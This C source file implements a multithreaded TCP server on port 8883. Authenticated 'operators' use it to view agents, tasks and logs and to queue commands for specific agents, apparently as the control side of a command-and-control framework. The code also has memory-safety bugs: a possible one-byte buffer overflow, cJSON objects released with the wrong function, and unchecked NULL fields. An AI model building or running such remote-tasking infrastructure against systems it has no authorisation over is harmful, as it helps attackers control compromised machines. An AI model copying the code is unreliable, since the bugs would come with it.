#ifndef operator
#define operator

#include <pthread.h>
#include <cjson/cJSON.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>

#include "db.h"
 

#define OPERATOR_PORT 8883

void *operator_handler(void *new_sock) {
    int sock = *(int*)new_sock;
    
    char auth[1024];
    int bytes_received = recv(sock, auth, sizeof(auth), 0);
    if (bytes_received <= 0) {
        perror("recv failed");
        return NULL;
    }
    auth[bytes_received] = '\0'; 
    cJSON *creds = cJSON_Parse(auth);

    if (creds == NULL) {
        fprintf(stderr, "Failed to parse JSON: %s\n", auth);
        return NULL;
    }


    cJSON *username = cJSON_GetObjectItem(creds, "username");
    

    if (username == NULL || !cJSON_IsString(username)) {
        fprintf(stderr, "Missing or invalid 'Username' field in JSON\n");
        cJSON_Delete(creds);
        return NULL;
    }
    cJSON *password = cJSON_GetObjectItem(creds, "password");
    if (password == NULL || !cJSON_IsString(password)) {
        fprintf(stderr, "Missing or invalid 'Password' field in JSON\n");
        cJSON_Delete(creds);
        return NULL;
    }

    cJSON *reply = cJSON_CreateObject();
    if (reply == NULL) {
        fprintf(stderr, "Failed to create cJSON object\n");
        // Handle error or exit
        return NULL;
    }  
    if (authenticate_operator(username->valuestring, password->valuestring) != 0) {
        cJSON_AddStringToObject(reply, "operator", "false");
        char *reply_ = cJSON_Print(reply);
        send(sock, reply_, strlen(reply_), 0);
        free(reply_);
        free(reply);
        goto CLEANUP;
    }
    cJSON_AddStringToObject(reply, "operator", "true");
    char *reply_ = cJSON_Print(reply);
    send(sock, reply_, strlen(reply_), 0);
    free(reply_);
    free(reply);
    // operator requesting infomartion or add new tasks
    while (1) {
        char buffer[1024];
        memset(buffer, 0, sizeof(buffer));
        bytes_received = recv(sock, buffer, sizeof(buffer), 0);
        if (bytes_received <= 0) {
            perror("recv failed");
            return NULL;
        }
        buffer[bytes_received] = '\0'; 
        cJSON *requested_info = cJSON_Parse(buffer);
        if (requested_info == NULL) {
            fprintf(stderr, "Failed to parse JSON: %s\n", buffer);
            return NULL;
        }
        cJSON *about = cJSON_GetObjectItem(requested_info, "Info");
        if (about == NULL || !cJSON_IsString(about)) {
            fprintf(stderr, "Missing or invalid 'Info' field in JSON\n");
            cJSON_Delete(requested_info);
            return NULL;
        }
        if (strcmp(about->valuestring, "Agents") == 0){
            char *agents = info_view("Agents");
            send(sock, agents, strlen(agents), 0);
            free(agents);
        } else if (strcmp(about->valuestring, "Tasks") == 0) {
            char *tasks = info_view("Tasks");
            send(sock, tasks, strlen(tasks), 0);
            free(tasks);
        } else if (strcmp(about->valuestring, "Logs") == 0) {
            char *logs = info_view("Logs");
            send(sock, logs, strlen(logs), 0);
            free(logs);
        } else if (strcmp(about->valuestring, "agent_id") == 0) {
            cJSON *agent_id = cJSON_GetObjectItem(requested_info, "agent_id");
            char *t = tasks_per_agent(agent_id->valuestring);
            send(sock, t, strlen(t), 0);
            free(t);
        } else if (strcmp(about->valuestring, "new_task") ==0 ) {
            cJSON *agent_id = cJSON_GetObjectItem(requested_info, "agent_id");
            cJSON *command = cJSON_GetObjectItem(requested_info, "command");
            new_tasks(agent_id->valuestring, command->valuestring);

            cJSON *tasks_added = cJSON_CreateObject();
            cJSON_AddStringToObject(tasks_added, "Tasks", "Added");
            char *data = cJSON_Print(tasks_added);
            send(sock, data, strlen(data), 0);
            free(data);
            cJSON_Delete(tasks_added);

        }
        cJSON_Delete(requested_info);
    }


    CLEANUP:
    cJSON_Delete(creds);
    
    close(sock);
    free(new_sock);
    return NULL;
}


void* Operator_conn() {
    struct sockaddr_in clientAddr;
    socklen_t client_len = sizeof(clientAddr);
    int serverSock;

    serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock == -1) {
        perror("Socket creation failed");
        return NULL;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(OPERATOR_PORT);
    serverAddr.sin_family = AF_INET;

    if (bind(serverSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr))) {
        perror("binding failed");
        close(serverSock);
        return NULL;
    }

    if (listen(serverSock, SOMAXCONN) == -1) {
        perror("Listen Failed");
        close(serverSock);
        return NULL;
    }
    
    while (1) {
        int sock;
        if ((sock = accept(serverSock, (struct sockaddr*)&clientAddr, (socklen_t*)&client_len)) < 0) {
            perror("Accept failed");
            continue;
        }
        
        // port = ntohs(clientAddr.sin_port) 
        // ip = inet_ntoa(client_addr.sin_addr)

        pthread_t thread;
        int *new_sock = malloc(sizeof(int));
        *new_sock = sock;
        if (pthread_create(&thread, NULL, operator_handler, (void*)new_sock) < 0) {
            perror("could not create thread");
            free(new_sock);
            continue;
        }
        // Detach thread so resources are automatically freed on exit
        pthread_detach(thread);
        
    }

    close(serverSock);

    return NULL;

}
#endif